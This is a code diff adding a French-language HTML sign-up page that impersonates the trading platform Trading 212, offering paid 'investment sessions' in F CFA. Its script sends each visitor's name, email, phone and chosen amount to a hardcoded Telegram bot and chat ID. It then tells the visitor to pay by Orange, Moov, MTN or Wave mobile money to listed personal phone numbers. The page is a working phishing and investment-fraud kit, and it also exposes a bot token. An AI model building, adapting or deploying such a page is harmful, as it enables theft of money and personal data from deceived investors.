@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <title>Trading 212 - Accueil & Inscription</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+    }
+
+    .section {
+      display: none;
+      padding: 40px 20px;
+      text-align: center;
+    }
+
+    .active {
+      display: block;
+    }
+
+    header {
+      background-color: black;
+      color: white;
+      padding: 15px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 24px;
+    }
+
+    .logo {
+      color: white;
+    }
+
+    .logo span {
+      color: #00a3e0;
+    }
+
+    .menu {
+      cursor: pointer;
+    }
+
+    .about {
+      max-width: 800px;
+      margin: auto;
+      text-align: left;
+      color: #333;
+      line-height: 1.6;
+      font-size: 16px;
+    }
+
+    .about h2 {
+      text-align: center;
+      color: #00a3e0;
+    }
+
+    .btn-inscription {
+      display: inline-block;
+      margin: 30px auto 0;
+      padding: 12px 24px;
+      background-color: #00a3e0;
+      color: white;
+      text-decoration: none;
+      font-weight: bold;
+      border-radius: 8px;
+      transition: background-color 0.3s ease;
+      cursor: pointer;
+    }
+
+    .btn-inscription:hover {
+      background-color: #0077aa;
+    }
+
+    .form-box, .confirmation-box {
+      background-color: white;
+      padding: 40px;
+      max-width: 600px;
+      margin: auto;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      text-align: left;
+    }
+
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin-top: 5px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+
+    .radio-group {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .radio-group label {
+      font-weight: normal;
+      display: flex;
+      align-items: center;
+    }
+
+    .radio-group input[type="radio"] {
+      margin-right: 10px;
+    }
+
+    button {
+      margin-top: 25px;
+      width: 100%;
+      padding: 14px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    .confirmation-box h2 {
+      color: #00a3e0;
+      text-align: center;
+    }
+
+    .confirmation-box p {
+      font-size: 18px;
+      line-height: 1.6;
+    }
+
+    .confirmation-box strong {
+      display: block;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .btn-retour {
+      display: block;
+      margin: 30px auto 0;
+      padding: 12px 24px;
+      background-color: #00a3e0;
+      color: white;
+      text-decoration: none;
+      font-weight: bold;
+      border-radius: 8px;
+      width: fit-content;
+      cursor: pointer;
+      border: none;
+      text-align: center;
+      transition: background-color 0.3s ease;
+    }
+
+    .btn-retour:hover {
+      background-color: #0077aa;
+    }
+
+    @media screen and (max-width: 600px) {
+      header {
+        font-size: 18px;
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      .form-box, .confirmation-box {
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo">TR<span>^</span>DING 212</div>
+    <div class="menu">&#9776;</div>
+  </header>
+
+  <!-- Section Accueil -->
+  <div id="accueil" class="section active">
+    <div class="about">
+      <h2>À propos de notre entreprise</h2>
+      <p>
+        Fondée le 14 janvier 2010 à Paris, notre entreprise de trading financier a été créée par Dupont William...
+      </p>
+      <p>
+        Nous croyons que l’avenir du trading passe par la connaissance, la technologie et la confiance.
+      </p>
+      <a class="btn-inscription" onclick="switchSection('formulaire')">Inscription</a>
+    </div>
+  </div>
+
+  <!-- Section Formulaire -->
+  <div id="formulaire" class="section">
+    <div class="form-box">
+      <h2>Inscription</h2>
+      <form id="inscription-form">
+        <label for="nom">Nom :</label>
+        <input type="text" id="nom" required>
+
+        <label for="prenom">Prénom :</label>
+        <input type="text" id="prenom" required>
+
+        <label for="email">Adresse e-mail :</label>
+        <input type="email" id="email" required>
+
+        <label for="telephone">Numéro de téléphone :</label>
+        <input type="tel" id="telephone" required>
+
+        <label for="montant">Montant à investir (F CFA) :</label>
+        <select id="montant" required>
+          <option value="">-- Sélectionnez un montant --</option>
+          <option value="30000">30 000 F CFA</option>
+          <option value="50000">50 000 F CFA</option>
+          <option value="100000">100 000 F CFA</option>
+          <option value="500000">500 000 F CFA</option>
+          <option value="1000000">1 000 000 F CFA</option>
+        </select>
+
+        <label for="duree">Nombre de sessions de 90 minutes :</label>
+        <select id="duree" required>
+          <option value="">-- Sélectionnez --</option>
+          <option value="1">1 session</option>
+          <option value="2">2 sessions</option>
+          <option value="3">3 sessions</option>
+        </select>
+
+        <label>Moyen de paiement :</label>
+        <div class="radio-group">
+          <label><input type="radio" name="paiement" value="Orange Money" required> Orange Money</label>
+          <label><input type="radio" name="paiement" value="Moov Money"> Moov Money</label>
+          <label><input type="radio" name="paiement" value="MTN Money"> MTN Money</label>
+          <label><input type="radio" name="paiement" value="Wave Mobile"> Wave Mobile</label>
+        </div>
+
+        <button type="submit">S'inscrire</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Section Confirmation -->
+  <div id="confirmation" class="section">
+    <div class="confirmation-box" id="confirmation-message">
+      <!-- Message injecté ici -->
+    </div>
+    <button class="btn-retour" onclick="switchSection('formulaire')">Retour au formulaire</button>
+  </div>
+
+  <!-- Script JS -->
+  <script>
+    function switchSection(sectionId) {
+      document.querySelectorAll('.section').forEach(section => {
+        section.classList.remove('active');
+      });
+      document.getElementById(sectionId).classList.add('active');
+    }
+
+    document.getElementById("inscription-form").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const paiement = document.querySelector('input[name="paiement"]:checked');
+      if (!paiement) {
+        alert("Veuillez sélectionner un moyen de paiement.");
+        return;
+      }
+
+      const nom = document.getElementById("nom").value;
+      const prenom = document.getElementById("prenom").value;
+      const email = document.getElementById("email").value;
+      const telephone = document.getElementById("telephone").value;
+      const montant = document.getElementById("montant").value;
+      const duree = document.getElementById("duree").value;
+      const moyen = paiement.value;
+
+      let message = "Veuillez, s’il vous plaît, procéder à la transaction via ";
+      switch (moyen) {
+        case "Moov Money":
+          message += "Moov Money au numéro : +225 0170846737.";
+          break;
+        case "Orange Money":
+          message += "Orange Money aux numéros : +225 0719746796 (CI) / +226 57646953 (BF).";
+          break;
+        case "MTN Money":
+        case "Wave Mobile":
+          message += moyen + " au numéro : +225 0544258505.";
+          break;
+      }
+
+      // Envoi Telegram
+      const telegramMessage = `
+📝 *Nouvelle inscription !*
+
+👤 Nom : ${prenom} ${nom}
+📧 Email : ${email}
+📞 Téléphone : ${telephone}
+💰 Montant : ${montant} F CFA
+⏱️ Sessions : ${duree}
+💳 Paiement : ${moyen}
+      `;
+
+      fetch("https://api.telegram.org/bot8420505641:AAHZ8MwkiCgvQQ3maoPpCn6HiXoXpbhZf7g/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "8147696054",
+          text: telegramMessage,
+          parse_mode: "Markdown"
+        })
+      });
+
+      document.getElementById('confirmation-message').innerHTML = `
+        <h2>Confirmation de Paiement</h2>
+        <p>${message}</p>
+        <p><strong>Merci pour votre inscription !</strong></p>
+      `;
+
+      switchSection('confirmation');
+    });
+  </script>
+</body>
+</html>
